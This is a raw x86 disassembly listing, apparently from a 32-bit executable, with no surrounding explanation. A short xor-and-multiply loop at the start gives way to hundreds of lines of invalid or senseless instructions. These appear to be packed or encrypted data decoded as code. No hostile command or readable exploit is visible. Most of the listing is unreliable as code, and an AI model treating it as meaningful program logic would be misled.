  40605c:	xor    ecx,eax
  40605e:	imul   edx,edx,0x5708f5
  406064:	add    ecx,esi
  406066:	lea    ecx,[ebp+ecx*4-0x64]
  40606a:	mov    edi,DWORD PTR [ecx]
  40606c:	add    edx,edi
  40606e:	mov    DWORD PTR [ecx],edx
  406070:	mov    ecx,DWORD PTR [ebp+0x8]
  406073:	xor    ecx,eax
  406075:	add    ecx,esi
  406077:	jne    0x406043
  40607d:	mov    ecx,DWORD PTR [ebp-0x8]
  406080:	xor    ecx,eax
  406082:	mov    eax,DWORD PTR [ebp+0x10]
  406085:	add    ecx,esi
  406087:	mov    DWORD PTR [eax],ecx
  406089:	pop    edi
  40608a:	jmp    0x40840d
  40608f:	inc    edx
  406090:	push   0x14
  406092:	add    DWORD PTR [ebx+ebp*2+0x53],esp
  406096:	imul   eax,esi,0x8a0f463
  40609c:	(bad)  
  40609d:	mov    esi,0x623cb6d4
  4060a2:	bound  ebx,QWORD PTR [edi+ebx*2]
  4060a5:	bound  esp,QWORD PTR [edx-0x65]
  4060a8:	in     eax,0x40
  4060aa:	xchg   bh,al
  4060ac:	add    ebp,DWORD PTR [eax+0x5f]
  4060af:	add    esp,ebx
  4060b1:	sbb    ecx,edx
  4060b3:	cmp    al,0xb9
  4060b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4060b6:	sub    ch,BYTE PTR [ebx+0x6b]
  4060b9:	fdivrp st(3),st
  4060bb:	hlt    
  4060bc:	shl    DWORD PTR ds:0x675a0567,1
  4060c2:	jno    0x406100
  4060c4:	ret    
  4060c5:	sub    esi,DWORD PTR [eax-0x61ca3195]
  4060cb:	add    edx,DWORD PTR [edx+edi*2-0x46]
  4060cf:	fisub  DWORD PTR [ecx+0x64ab110c]
  4060d5:	cmp    eax,0xc40a49ae
  4060da:	test   BYTE PTR [ebx],0xe8
  4060dd:	sub    al,0x24
  4060df:	jp     0x406066
  4060e1:	mov    BYTE PTR [edi-0x4e],dh
  4060e4:	ja     0x40608f
  4060e6:	pop    eax
  4060e7:	inc    edx
  4060e8:	enter  0x4c70,0x44
  4060ec:	mov    eax,ds:0xb7fbd09e
  4060f1:	enter  0xae4d,0x57
  4060f5:	dec    esp
  4060f6:	ss mov bh,0xf9
  4060f9:	xchg   esi,eax
  4060fa:	test   DWORD PTR [esi+0x5d285fb8],0x6ca0483f
  406104:	fwait
  406105:	and    BYTE PTR [ebp-0x1a],0x15
  406109:	or     BYTE PTR [edx-0xc],cl
  40610c:	pusha  
  40610d:	leave  
  40610e:	jae    0x406097
  406110:	adc    DWORD PTR [ebp+0x543dbbc8],esi
  406116:	popf   
  406117:	push   ebx
  406118:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406119:	dec    ebp
  40611a:	mov    dl,0xe7
  40611c:	pop    edx
  40611d:	jmp    DWORD PTR [ecx]
  40611f:	cmc    
  406120:	jge    0x406142
  406122:	jne    0x40610d
  406124:	lahf   
  406125:	iret   
  406126:	(bad)  
  406127:	lea    ebp,[edi+0x6a695e52]
  40612d:	xor    eax,0x559302c0
  406132:	cld    
  406133:	inc    ecx
  406134:	(bad)  
  406135:	push   ss
  406136:	mov    ds:0xe85c8f10,eax
  40613b:	xchg   edx,eax
  40613c:	pop    esp
  40613d:	loop   0x4060dc
  40613f:	push   cs
  406140:	cmp    DWORD PTR [eax-0x69c1688c],edx
  406146:	xchg   edx,eax
  406147:	mov    bh,0x11
  406149:	(bad)  
  40614a:	push   ss
  40614b:	pop    ebx
  40614c:	or     bl,ch
  40614e:	mov    ds:0xd3948cfc,eax
  406153:	mov    ebx,0x3fcc89d2
  406158:	dec    esp
  406159:	js     0x406194
  40615b:	pushf  
  40615c:	js     0x40613c
  40615e:	mov    al,BYTE PTR [edx+0x61a04611]
  406164:	or     eax,0x9bc36eac
  406169:	adc    ebx,DWORD PTR [edx-0x6c]
  40616c:	xchg   ecx,eax
  40616d:	cwde   
  40616e:	mov    bh,0xe2
  406170:	retf   
  406171:	popa   
  406172:	shl    DWORD PTR [ecx+0x19],cl
  406175:	jno    0x4061d7
  406177:	loopne 0x40618d
  406179:	repz xchg ecx,eax
  40617b:	sbb    esi,DWORD PTR [edi+0x27]
  40617e:	(bad)  
  40617f:	mov    eax,ds:0x53348140
  406184:	ja     0x40614a
  406186:	lahf   
  406187:	jbe    0x4061e3
  406189:	and    esi,DWORD PTR [ecx+0x37]
  40618c:	enter  0xa602,0xf2
  406190:	inc    ebp
  406191:	sbb    eax,DWORD PTR [ebx+0x187c01ad]
  406197:	sbb    esp,DWORD PTR [eax]
  406199:	pop    ds
  40619a:	aas    
  40619b:	dec    ebp
  40619c:	stos   DWORD PTR es:[edi],eax
  40619d:	and    ecx,DWORD PTR [ebp-0xd]
  4061a0:	inc    edx
  4061a1:	mov    al,ds:0x9a091e80
  4061a6:	mov    eax,0xcdfc18d7
  4061ab:	mov    ah,0xfc
  4061ad:	jl     0x406187
  4061af:	popa   
  4061b0:	(bad)  
  4061b1:	ds pop ss
  4061b3:	inc    edi
  4061b4:	jle    0x406136
  4061b6:	sub    al,0xab
  4061b8:	dec    edx
  4061b9:	mov    al,0xc
  4061bb:	cmp    ebp,DWORD PTR ss:[edi+0x411271a7]
  4061c2:	mov    DWORD PTR [eax+0x177c86c],eax
  4061c8:	dec    ebx
  4061c9:	dec    esi
  4061ca:	dec    edx
  4061cb:	xchg   edx,eax
  4061cc:	sbb    ebx,0x6374aca9
  4061d2:	add    al,0x73
  4061d4:	or     ch,BYTE PTR [esi]
  4061d6:	shl    BYTE PTR [ecx],1
  4061d8:	and    ecx,DWORD PTR [ecx]
  4061da:	idiv   edx
  4061dc:	pop    esp
  4061dd:	ret    0x4509
  4061e0:	xor    ah,BYTE PTR [edi+0x5d]
  4061e3:	bound  esi,QWORD PTR [ecx]
  4061e5:	mov    ecx,0x45d7ac10
  4061ea:	and    al,0x10
  4061ec:	lock jp 0x4061b1
  4061ef:	push   edi
  4061f0:	stos   DWORD PTR es:[edi],eax
  4061f1:	fwait
  4061f2:	jbe    0x40618c
  4061f4:	(bad)  
  4061f5:	lods   eax,DWORD PTR ds:[esi]
  4061f6:	mov    eax,0x82a86d34
  4061fb:	sbb    DWORD PTR [eax+edx*8+0x77],edi
  4061ff:	and    al,0xb1
  406201:	cwde   
  406202:	xchg   ebx,eax
  406203:	sahf   
  406204:	xchg   ecx,eax
  406205:	or     eax,DWORD PTR ds:0x52af60c2
  40620b:	mov    edx,0x7c2c67c4
  406210:	dec    eax
  406211:	inc    esp
  406212:	popf   
  406213:	loopne 0x4061b5
  406215:	lods   eax,DWORD PTR ds:[esi]
  406216:	jno    0x4061df
  406218:	pop    ebp
  406219:	push   cs
  40621a:	and    eax,0x43a8d448
  40621f:	jo     0x4061f5
  406221:	imul   DWORD PTR [ebx+0x196daf50]
  406227:	jnp    0x4061fc
  406229:	cmp    BYTE PTR [edx+eiz*8+0x61e25816],ah
  406230:	mov    ds:0x723b23a3,al
  406235:	popf   
  406236:	mov    ebp,0x4a828d9
  40623b:	xchg   esi,eax
  40623c:	out    0xb3,al
  40623e:	xor    dh,BYTE PTR [edi+0xe]
  406241:	add    dl,ah
  406243:	cmp    ebp,edx
  406245:	hlt    
  406246:	jmp    0x4061ee
  406248:	popf   
  406249:	push   ebx
  40624a:	adc    eax,0xda3daf5a
  40624f:	lods   eax,DWORD PTR ds:[esi]
  406250:	dec    edx
  406251:	mov    eax,0xa512fb1a
  406256:	pop    esi
  406257:	or     BYTE PTR [ebp+0x5add4c7c],cl
  40625d:	mov    ah,0xf0
  40625f:	aad    0xb1
  406261:	popf   
  406262:	cmp    edi,edx
  406264:	shl    BYTE PTR [ebp+0x7e],0xc
  406268:	jp     0x406220
  40626a:	jl     0x40628c
  40626c:	fild   DWORD PTR [ebx+0x443a6b3a]
  406272:	xor    esp,DWORD PTR [eax-0x25917594]
  406278:	xchg   DWORD PTR [edi-0x74362aee],esp
  40627e:	adc    esi,DWORD PTR [esi]
  406280:	les    ebx,FWORD PTR [ebp+0x40]
  406283:	and    eax,0x4e8952ad
  406288:	scas   eax,DWORD PTR es:[edi]
  406289:	aad    0xd9
  40628b:	aas    
  40628c:	jl     0x406279
  40628e:	add    eax,0x5b6411cb
  406293:	nop
  406294:	mov    al,0xf8
  406296:	add    BYTE PTR [esi-0x2cbf75f],bl
  40629c:	mov    DWORD PTR [edx],ecx
  40629e:	mov    eax,ds:0x18ad2e63
  4062a3:	test   DWORD PTR [ebx],eax
  4062a5:	ja     0x406271
  4062a7:	int3   
  4062a8:	retf   
  4062a9:	leave  
  4062aa:	daa    
  4062ab:	std    
  4062ac:	xchg   esi,eax
  4062ad:	xchg   BYTE PTR [edi],cl
  4062af:	sbb    eax,0xeffffb70
  4062b4:	pop    es
  4062b5:	int3   
  4062b6:	push   edx
  4062b7:	stos   DWORD PTR es:[edi],eax
  4062b8:	lds    esp,FWORD PTR ds:0xa5a040c3
  4062be:	add    ebx,DWORD PTR [ebp-0xfdbd26c]
  4062c4:	dec    edi
  4062c5:	sbb    esi,DWORD PTR [ebx]
  4062c7:	stos   BYTE PTR es:[edi],al
  4062c8:	and    al,cl
  4062ca:	inc    esp
  4062cb:	ret    0x1e81
  4062ce:	mov    ah,0xb4
  4062d0:	test   al,0x65
  4062d2:	addr16 in al,0x63
  4062d5:	sub    al,BYTE PTR [edi+esi*2+0x14]
  4062d9:	push   esp
  4062da:	sti    
  4062db:	sbb    DWORD PTR [ebx-0x667b9415],edi
  4062e1:	outs   dx,BYTE PTR ds:[esi]
  4062e2:	or     ebx,esi
  4062e4:	int3   
  4062e5:	mov    dl,0x2c
  4062e7:	sbb    BYTE PTR [esi+0xd],0x18
  4062eb:	dec    ecx
  4062ec:	psrad  mm0,mm0
  4062ef:	cmp    eax,0xe02d105
  4062f4:	cmp    eax,0xc3dde827
  4062f9:	dec    ebx
  4062fa:	push   es
  4062fb:	jmp    0x709b:0x6ebb615b
  406302:	lock or bl,BYTE PTR [edx-0x6e]
  406306:	shr    BYTE PTR [ecx+0x43],1
  406309:	xchg   edi,eax
  40630a:	ins    BYTE PTR es:[edi],dx
  40630b:	jl     0x4062fe
  40630d:	mov    ecx,0xadb790f5
  406312:	stos   BYTE PTR es:[edi],al
  406313:	inc    ebx
  406314:	pop    ss
  406315:	out    dx,eax
  406316:	cmc    
  406317:	retf   0x84c7
  40631a:	fisttp QWORD PTR [edx+0xe]
  40631d:	jno    0x4062e0
  40631f:	xlat   BYTE PTR ds:[ebx]
  406320:	aas    
  406321:	stc    
  406322:	dec    esi
  406323:	pop    ebx
  406324:	into   
  406325:	push   ecx
  406326:	rcl    ch,cl
  406328:	cmp    BYTE PTR [ebx+0x236d6851],cl
  40632e:	pop    ebp
  40632f:	imul   ebp,eax,0x25
  406332:	jecxz  0x40633f
  406334:	loop   0x40634f
  406336:	cmp    BYTE PTR [eax],bh
  406338:	gs pushf 
  40633a:	mov    ds:0xab32c740,eax
  40633f:	cdq    
  406340:	arpl   WORD PTR [eax],cx
  406342:	adc    DWORD PTR ds:0xfcc0fe71,0xc5f2af00
  40634c:	out    dx,al
  40634d:	mov    cl,BYTE PTR [edi]
  40634f:	cmp    DWORD PTR [ebx],0x2450884
  406355:	ficom  WORD PTR [eax]
  406357:	fisub  DWORD PTR [edx-0x2a]
  40635a:	sbb    eax,0xaacfdf9d
  40635f:	into   
  406360:	mov    esp,0xd000ee14
  406365:	xchg   BYTE PTR [ebp+0xe],dh
  406368:	sahf   
  406369:	scas   eax,DWORD PTR es:[edi]
  40636a:	dec    esp
  40636b:	scas   eax,DWORD PTR es:[edi]
  40636c:	repnz mov bl,BYTE PTR [edi+0xf]
  406370:	aaa    
  406371:	out    dx,eax
  406372:	imul   esi,DWORD PTR [eax+0x67],0x32
  406376:	xlat   BYTE PTR ds:[ebx]
  406377:	pop    edx
  406378:	cmp    dl,BYTE PTR [ebp-0xc60cf4d]
  40637e:	jmp    0x4063c6
  406380:	pop    ds
  406381:	push   edx
  406382:	and    eax,0xd024bc4a
  406387:	jmp    0x3957:0x9fbefdd6
  40638e:	sub    al,0x52
  406390:	int    0xef
  406392:	sahf   
  406393:	stos   BYTE PTR es:[edi],al
  406394:	(bad)  
  406395:	fiadd  WORD PTR [ebx+0x4d]
  406398:	out    0xa3,al
  40639a:	outs   dx,BYTE PTR ds:[esi]
  40639b:	loop   0x40632c
  40639d:	mov    esi,0x77aea8d
  4063a2:	mov    eax,ds:0xf863ad55
  4063a7:	je     0x4063af
  4063a9:	rol    esp,cl
  4063ab:	imul   ecx,DWORD PTR [edx],0x6c9a1eac
  4063b1:	out    dx,eax
  4063b2:	push   edi
  4063b3:	dec    ebp
  4063b4:	sub    al,0xae
  4063b6:	sti    
  4063b7:	aad    0x3b
  4063b9:	dec    esp
  4063ba:	(bad)  
  4063bb:	push   ss
  4063bc:	popf   
  4063bd:	std    
  4063be:	adc    esi,DWORD PTR [edi]
  4063c0:	out    dx,al
  4063c1:	xor    eax,0x4cefe994
  4063c6:	and    al,0xd3
  4063c8:	aaa    
  4063c9:	or     DWORD PTR [ecx-0x192c199f],0x2f
  4063d0:	and    al,0x91
  4063d2:	in     eax,dx
  4063d3:	dec    ebp
  4063d4:	imul   esi,ebx,0x63564e18
  4063da:	sbb    al,0x33
  4063dc:	add    al,0x1c
  4063de:	ficom  DWORD PTR [eax+0x26]
  4063e1:	sbb    eax,0x915dc0f
  4063e6:	les    eax,FWORD PTR [edx-0x49]
  4063e9:	xor    ebp,ebp
  4063eb:	pop    edi
  4063ec:	outs   dx,DWORD PTR es:[esi]
  4063ee:	mov    esp,0x5b9eac61
  4063f3:	rcl    BYTE PTR [ebp+esi*4-0x32],cl
  4063f7:	retf   0x11d2
  4063fa:	je     0x40639c
  4063fc:	fiadd  DWORD PTR [ebx]
  4063fe:	sbb    bl,BYTE PTR [ebx]
  406400:	(bad)  
  406401:	jbe    0x40638a
  406403:	ret    0xf17c
  406406:	dec    eax
  406407:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406408:	adc    eax,0x9ac349e9
  40640d:	cmp    eax,0x726eb256
  406412:	inc    eax
  406413:	sbb    eax,0x2d60d15b
  406418:	push   ebx
  406419:	mov    dh,0x9a
  40641b:	lahf   
  40641c:	cs and al,0x85
  40641f:	cmp    DWORD PTR [esi],esp
  406421:	gs mov al,0x77
  406424:	sub    BYTE PTR [esi-0x65],0xec
  406428:	jbe    0x406467
  40642a:	jo     0x40641e
  40642c:	inc    eax
  40642d:	sbb    al,0x69
  40642f:	test   BYTE PTR [esi-0x3d],ch
  406432:	clc    
  406433:	inc    eax
  406434:	repnz call 0xa5c7:0x2d85c147
  40643c:	enter  0x7633,0x55
  406440:	dec    ecx
  406441:	lahf   
  406442:	sub    BYTE PTR [esi],dh
  406444:	cmp    cl,BYTE PTR [edx-0x6f7489e1]
  40644a:	jo     0x40648a
  40644c:	xchg   ecx,eax
  40644d:	add    edx,esp
  40644f:	xor    DWORD PTR [eax-0x46e2466e],0xffffffeb
  406456:	or     BYTE PTR [ecx+0x59a4c941],bl
  40645c:	and    BYTE PTR [esi+ebp*2],ch
  40645f:	jb     0x40646e
  406461:	rcl    DWORD PTR fs:[eax+eax*2],cl
  406465:	push   edi
  406466:	and    ch,BYTE PTR ds:0xbb0d7a4b
  40646c:	icebp  
  40646d:	ins    BYTE PTR es:[edi],dx
  40646e:	pop    esi
  40646f:	add    cl,cl
  406471:	pop    edi
  406472:	loopne 0x40648c
  406474:	(bad)  
  406475:	fidiv  DWORD PTR [ebx]
  406477:	mov    edx,0x185f732d
  40647c:	repnz test BYTE PTR [ecx+edi*4],bl
  406480:	lea    esp,[esi]
  406482:	ret    0x467b
  406485:	xchg   ecx,eax
  406486:	jecxz  0x4064de
  406488:	xchg   DWORD PTR [edx],esi
  40648a:	add    al,0xee
  40648c:	repz sub cl,BYTE PTR [esi]
  40648f:	popa   
  406490:	xchg   esp,eax
  406491:	jge    0x40646c
  406493:	adc    al,0xe8
  406495:	dec    eax
  406496:	cmp    ch,BYTE PTR [ecx-0x26087d8d]
  40649c:	sbb    eax,0x882c58c7
  4064a1:	add    ah,BYTE PTR [ecx+esi*4-0x4bc24bb4]
  4064a8:	dec    ecx
  4064a9:	in     eax,0x7
  4064ab:	lock ret 
  4064ad:	push   es
  4064ae:	add    esp,eax
  4064b0:	pop    edx
  4064b1:	add    DWORD PTR [eax],edi
  4064b3:	outs   dx,BYTE PTR ds:[esi]
  4064b4:	retf   0x42e2
  4064b7:	push   eax
  4064b8:	cmp    bh,ch
  4064ba:	xor    DWORD PTR [edx+0x97ca969],edi
  4064c0:	pop    ebx
  4064c1:	icebp  
  4064c2:	mov    ds:0x8eca2304,al
  4064c7:	xor    al,0x0
  4064c9:	push   0x56
  4064cb:	in     al,dx
  4064cc:	adc    edx,eax
  4064ce:	daa    
  4064cf:	shl    ebp,cl
  4064d1:	xor    cl,dh
  4064d3:	jae    0x40645c
  4064d5:	dec    eax
  4064d6:	aad    0x86
  4064d8:	xor    eax,esi
  4064da:	loope  0x406461
  4064dc:	stos   BYTE PTR es:[edi],al
  4064dd:	ja     0x4064bb
  4064df:	jl     0x4064ef
  4064e1:	sbb    cl,BYTE PTR [eax]
  4064e3:	retf   0x6165
  4064e6:	mov    ch,0x45
  4064e8:	popf   
  4064e9:	xor    edi,DWORD PTR [edx+0x651c69e0]
  4064ef:	int    0xe5
  4064f1:	cmp    edx,DWORD PTR [ebp-0x1c]
  4064f4:	imul   ecx,DWORD PTR [ecx],0x67e80c5f
  4064fa:	xchg   edi,eax
  4064fb:	(bad)  
  4064fc:	lahf   
  4064fd:	cs stos DWORD PTR es:[edi],eax
  4064ff:	sub    bl,BYTE PTR [edi]
  406501:	xchg   edx,eax
  406502:	repnz aad 0x5
  406505:	out    dx,al
  406506:	xor    DWORD PTR [esi],0x2a
  406509:	mov    esp,0x205df4b8
  40650e:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406510:	pusha  
  406511:	dec    esi
  406512:	add    al,0xce
  406514:	scas   eax,DWORD PTR es:[edi]
  406515:	out    dx,eax
  406516:	dec    ecx
  406517:	ficom  WORD PTR [ecx]
  406519:	mov    ds:0xf24e27cc,eax
  40651e:	ss ss aas 
  406521:	(bad)  
  406522:	repz push ds
  406524:	xor    DWORD PTR [ecx+edi*1-0x508d936c],edx
  40652b:	cli    
  40652c:	dec    esp
  40652d:	add    eax,0xd637c4b2
  406532:	pop    edi
  406533:	and    edx,ecx
  406535:	adc    BYTE PTR [edx+0x65],bh
  406538:	add    eax,DWORD PTR [edx+eiz*4]
  40653b:	ja     0x406552
  40653d:	mov    ebx,0xc08d10ad
  406542:	add    eax,0x72266ac8
  406547:	ja     0x40651a
  406549:	mov    bh,0xc6
  40654b:	inc    esp
  40654c:	push   ecx
  40654d:	int    0xc2
  40654f:	sbb    cl,BYTE PTR [esi]
  406551:	adc    ah,cl
  406553:	mov    bl,BYTE PTR [ecx-0x6711644a]
  406559:	pop    edi
  40655a:	push   es
  40655b:	cmp    BYTE PTR [edx-0x6a],al
  40655e:	pop    edi
  40655f:	lock push edi
  406561:	jecxz  0x40650c
  406563:	es scas eax,DWORD PTR es:[edi]
  406565:	cmp    edx,DWORD PTR [edi-0x5]
  406568:	cli    
  406569:	and    ch,BYTE PTR [ecx-0x7be2c29c]
  40656f:	data16 xor al,0xd4
  406572:	and    DWORD PTR [esi+0x236665eb],0x1f4e2b2
  40657c:	xchg   esi,eax
  40657d:	cmp    eax,0xcd909654
  406582:	and    DWORD PTR [esi],edx
  406584:	js     0x40657d
  406586:	in     al,0x64
  406588:	js     0x4065b4
  40658a:	lods   eax,DWORD PTR ds:[esi]
  40658b:	fdivr  DWORD PTR ds:0xf238311c
  406591:	(bad)  
  406592:	fstp   QWORD PTR [eax+eax*8-0x701e3d0a]
  406599:	retw   
  40659b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40659c:	xchg   BYTE PTR [ebx+0x40],bh
  40659f:	ins    DWORD PTR es:[edi],dx
  4065a0:	jl     0x406533
  4065a2:	repnz aam 0x8f
  4065a5:	inc    esi
  4065a6:	cmp    ebp,DWORD PTR [ebx+0x75]
  4065a9:	xchg   esi,eax
  4065aa:	or     al,0x6a
  4065ac:	push   ds
  4065ad:	xor    DWORD PTR [edx+0x50254180],edi
  4065b3:	sbb    BYTE PTR [ecx],al
  4065b5:	add    BYTE PTR [esi-0x7611a3a5],0xff
  4065bc:	mov    dh,0x55
  4065be:	sub    al,0xea
  4065c0:	xchg   ebx,ebx
  4065c2:	mov    fs,WORD PTR [edx-0x2d181e2a]
  4065c8:	add    edi,DWORD PTR ds:0xd4f4542d
  4065ce:	int    0x3f
  4065d0:	test   eax,ebx
  4065d2:	push   ecx
  4065d3:	sub    eax,0x869cde96
  4065d8:	hlt    
  4065d9:	rol    al,1
  4065db:	mov    ah,0xfd
  4065dd:	mov    ebp,0x612ee50f
  4065e2:	and    BYTE PTR [ebp-0x18],al
  4065e5:	pop    eax
  4065e6:	cmp    eax,0xcc4a8452
  4065eb:	rol    BYTE PTR [esi],0x45
  4065ee:	jae    0x40664f
  4065f0:	cmp    ah,ah
  4065f2:	jae    0x4065a5
  4065f4:	push   edi
  4065f5:	dec    DWORD PTR [ecx]
  4065f7:	cmp    al,0xa1
  4065f9:	xchg   edi,eax
  4065fa:	and    edx,eax
  4065fc:	icebp  
  4065fd:	gs mov es:0x69f2f43d,eax
  406604:	cmc    
  406605:	fisub  WORD PTR [ebx+esi*1-0x6c2fc771]
  40660c:	nop
  40660d:	call   0x453961c5
  406612:	mov    bl,0xa2
  406614:	cmp    dh,BYTE PTR [ebx+0x6a]
  406617:	bound  esi,QWORD PTR [edi+0x3f]
  40661a:	test   DWORD PTR [eax+0x38],ebx
  40661d:	sub    BYTE PTR [ecx+0x2c],0xe7
  406621:	jb     0x406610
  406623:	(bad)  
  406624:	stos   DWORD PTR es:[edi],eax
  406625:	pusha  
  406626:	loope  0x40668c
  406628:	ss sti 
  40662a:	xchg   edi,eax
  40662b:	xchg   ebx,eax
  40662c:	mul    BYTE PTR [ecx-0x45]
  40662f:	fwait
  406630:	in     eax,dx
  406631:	loope  0x406669
  406633:	(bad)  
  406634:	pop    ebx
  406635:	push   ebx
  406636:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406638:	stc    
  406639:	adc    DWORD PTR [eax-0x5e768cc7],esp
  40663f:	and    ebp,edi
  406641:	(bad)  
  406643:	out    0x73,al
  406645:	dec    ebp
  406646:	jl     0x406600
  406648:	pop    es
  406649:	mov    ah,0xe
  40664b:	clc    
  40664c:	sub    eax,0x386e7e05
  406651:	push   ebp
  406652:	lea    edx,[edi-0xd]
  406655:	pop    ebp
  406656:	push   es
  406657:	adc    eax,0xa73f7586
  40665c:	stos   BYTE PTR es:[edi],al
  40665d:	loop   0x40661f
  40665f:	es (bad) 
  406661:	mov    dh,0xf1
  406663:	xchg   BYTE PTR [eax+ebp*2-0x73],dh
  406667:	mov    al,ds:0xea6c49d8
  40666c:	and    BYTE PTR [edx+0x120e0fb1],bl
  406672:	mov    bh,0xe5
  406674:	loope  0x406646
  406676:	inc    esi
  406677:	sbb    al,0xcf
  406679:	(bad)  
  40667a:	and    eax,0x81e18edf
  40667f:	mov    edi,0x4825a204
  406684:	mov    ds:0xb09e59c0,eax
  406689:	sbb    ebp,DWORD PTR [esi-0x7e5b5580]
  40668f:	retf   
  406690:	aam    0x97
  406692:	push   ebp
  406693:	mov    cl,0x86
  406695:	jl     0x40665c
  406697:	neg    DWORD PTR [ebx+0x29]
  40669a:	fild   WORD PTR [ebx-0x10]
  40669d:	pushf  
  40669e:	out    0xd5,al
  4066a0:	xor    cl,BYTE PTR [eax-0x52]
  4066a3:	mov    edx,0x360fde7
  4066a8:	ins    BYTE PTR es:[edi],dx
  4066a9:	and    DWORD PTR [ecx+edi*8-0x6ecdb16],ecx
  4066b0:	js     0x4066de
  4066b2:	push   ss
  4066b3:	inc    esi
  4066b4:	loope  0x40669a
  4066b6:	out    0xcf,al
  4066b8:	(bad)  
  4066b9:	mov    bh,0xf0
  4066bb:	add    eax,0x66419762
  4066c0:	sub    BYTE PTR [eax-0x41dfa266],dh
  4066c6:	in     al,0x97
  4066c8:	mov    bl,0x30
  4066ca:	in     eax,0x83
  4066cc:	neg    BYTE PTR [edx-0x466b789b]
  4066d2:	xor    al,0xb1
  4066d4:	mov    edi,ecx
  4066d6:	xor    DWORD PTR [edi-0x4819ee64],ebp
  4066dc:	cmp    edi,ecx
  4066de:	in     al,dx
  4066df:	pop    eax
  4066e0:	shl    esi,cl
  4066e2:	mov    ds:0x29f60737,eax
  4066e7:	ficomp DWORD PTR [edi+edx*8+0x49]
  4066eb:	(bad)  
  4066ed:	pop    ebx
  4066ee:	addr16 jmp 0x37b6:0x9b0faa70
  4066f6:	mov    bh,0x9a
  4066f8:	or     al,0xf8
  4066fa:	sub    al,0xf7
  4066fc:	ret    
  4066fd:	jle    0x406737
  4066ff:	outs   dx,BYTE PTR ds:[esi]
  406700:	shl    BYTE PTR [esi+0x4c88e30f],0x77
  406707:	push   0x31
  406709:	sbb    DWORD PTR [edx+0x74],edi
  40670c:	into   
  40670d:	xchg   BYTE PTR [ebx-0x153a4322],dh
  406713:	xor    al,0x54
  406715:	sbb    ebp,DWORD PTR [ebp-0x278698e3]
  40671b:	adc    ecx,ebx
  40671d:	or     ebp,ebx
  40671f:	call   0x18d9:0x1bcf992c
  406726:	cld    
  406727:	loop   0x406700
  406729:	js     0x4066f0
  40672b:	pop    ecx
  40672c:	call   0xc8fa:0x62fb9e99
  406733:	int    0x42
  406735:	mov    cl,0xf5
  406737:	or     BYTE PTR [edx+0x13],cl
  40673a:	repz inc edx
  40673c:	inc    ebp
  40673d:	pusha  
  40673e:	xchg   BYTE PTR [edi],dl
  406740:	popa   
  406741:	les    edi,FWORD PTR [esi+ecx*1-0x5fbda814]
  406748:	adc    BYTE PTR [esi-0x21],ah
  40674b:	sub    edi,DWORD PTR [ebp+0x3e]
  40674e:	dec    ebp
  40674f:	scas   eax,DWORD PTR es:[edi]
  406750:	aam    0x75
  406752:	rcl    cl,1
  406754:	add    BYTE PTR [ebx+0x3370404a],al
  40675a:	fcmovb st,st(7)
  40675c:	repz test eax,0x753612c7
  406762:	xlat   BYTE PTR ds:[ebx]
  406763:	bound  ebx,QWORD PTR [ebx+0x61]
  406766:	idiv   bl
  406768:	xchg   ecx,eax
  406769:	imul   ebx,DWORD PTR [esi+0x206fd79e],0xffffffc5
  406770:	cmp    eax,0x6240ce8
  406775:	icebp  
  406776:	iret   
  406777:	dec    DWORD PTR [ebp+0x7b]
  40677a:	mul    DWORD PTR [edx-0x14b4c5ec]
  406780:	or     DWORD PTR [edi+0x64],0xffffffe4
  406784:	sub    eax,0xa2723a2
  406789:	or     ebx,DWORD PTR [ebp-0x5ab5095e]
  40678f:	or     BYTE PTR [ebx-0x7b],bh
  406792:	jmp    0x4067d4
  406794:	pop    ds
  406795:	(bad)  
  406796:	push   esp
  406797:	ret    
  406798:	xchg   edx,eax
  406799:	xor    BYTE PTR [eax-0x656b159],dh
  40679f:	pop    esp
  4067a0:	jle    0x4067dc
  4067a2:	scas   eax,DWORD PTR es:[edi]
  4067a3:	lock shl eax,1
  4067a6:	sbb    edi,DWORD PTR [eax+0x76]
  4067a9:	xchg   ch,cl
  4067ab:	mov    dl,BYTE PTR [edx+0x24f6d058]
  4067b1:	in     eax,dx
  4067b2:	pusha  
  4067b3:	mov    edi,0x2f75f421
  4067b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4067b9:	sti    
  4067ba:	je     0x406764
  4067bc:	pop    ecx
  4067bd:	adc    bh,BYTE PTR [esi-0x2835880]
  4067c3:	aad    0x34
  4067c5:	or     bl,BYTE PTR [ecx-0x6f]
  4067c8:	das    
  4067c9:	fwait
  4067ca:	data16 sti 
  4067cc:	ret    0x617c
  4067cf:	jne    0x406840
  4067d1:	es add eax,0xab804372
  4067d7:	adc    DWORD PTR [edx-0x1a],0x70c49fff
  4067de:	dec    esi
  4067df:	push   ds
  4067e0:	jmp    0x8f0c:0xbec6b877
  4067e7:	daa    
  4067e8:	aaa    
  4067e9:	ins    BYTE PTR es:[edi],dx
  4067ea:	ficomp DWORD PTR [ebp+0x6434d1fd]
  4067f0:	adc    DWORD PTR [ebx],ebp
  4067f2:	jbe    0x40681f
  4067f4:	arpl   dx,ax
  4067f6:	add    esp,DWORD PTR [ebp-0x1f]
  4067f9:	and    eax,0x972c3ff1
  4067fe:	es cs pop ss
  406801:	adc    ah,BYTE PTR [eax+0x4a]
  406804:	outs   dx,BYTE PTR ds:[esi]
  406805:	daa    
  406806:	sbb    ebp,DWORD PTR [edx+0x74]
  406809:	pushf  
  40680a:	ss iret 
  40680c:	dec    eax
  40680d:	push   esi
  40680e:	enter  0x18b1,0xdb
  406812:	dec    ebp
  406813:	push   es
  406814:	stos   DWORD PTR es:[edi],eax
  406815:	ficomp DWORD PTR [ebx-0x61]
  406818:	jno    0x406884
  40681a:	add    al,0xf2
  40681c:	cmp    al,0x14
  40681e:	imul   edx,eax,0x47
  406821:	retf   0xc46d
  406824:	and    dl,BYTE PTR [eax]
  406826:	not    DWORD PTR [edi]
  406828:	fidivr WORD PTR [edi-0x7f7efa79]
  40682e:	jge    0x406800
  406830:	sub    eax,0x2b0eeee3
  406835:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406836:	or     eax,0xb8065e08
  40683b:	pop    ebp
  40683c:	xlat   BYTE PTR ds:[ebx]
  40683d:	pop    esi
  40683e:	xchg   esi,eax
  40683f:	nop
  406840:	imul   ebp,ebx,0xffffffc9
  406843:	ret    
